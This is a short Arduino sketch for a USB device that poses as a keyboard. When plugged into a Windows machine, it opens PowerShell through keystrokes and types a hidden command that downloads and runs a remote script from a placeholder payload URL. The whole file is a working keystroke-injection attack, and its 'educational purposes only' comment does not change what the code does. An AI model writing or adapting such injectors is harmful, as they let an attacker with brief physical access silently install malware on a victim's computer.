// please use for educational purposes only

#include <HIDKeyboard.h>
HIDKeyboard keyboard;

void setup() {
  keyboard.begin();
  delay(2000);
}

void loop() {
  keyboard.pressKey(GUI, 'x');  // open up powershell
  keyboard.releaseKey();
  keyboard.pressKey('i');
  keyboard.releaseKey();
  delay(2000);

  keyboard.println("powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).downloadString('**insert payload url here**')\"");  
  
  while(1);
}
